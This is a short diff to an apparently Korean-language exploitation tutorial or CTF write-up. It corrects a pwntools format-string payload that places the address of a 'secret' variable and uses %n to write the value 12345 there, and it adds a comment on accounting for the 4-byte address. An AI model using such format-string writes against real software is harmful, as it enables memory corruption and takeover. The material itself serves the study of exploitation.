@@ -586,7 +586,7 @@ print(p.recvall())
 ```python
 # 포맷 스트링을 먼저 쓰고, 바로 주소를 이어붙임
 fstring  = p32(addr_secret)   # [ESP+4] = &secret
-fstring += b"%12345c%1$n"     # 1번째 인자([ESP+4])에 12345 쓰기
+fstring += b"%12341c%1$n"     # 1번째 인자([ESP+4])에 12345 쓰기, 주소값이 4바이트이므로 12345를 저장하기 위해 12341만큼 입력
 ```
 
 ---
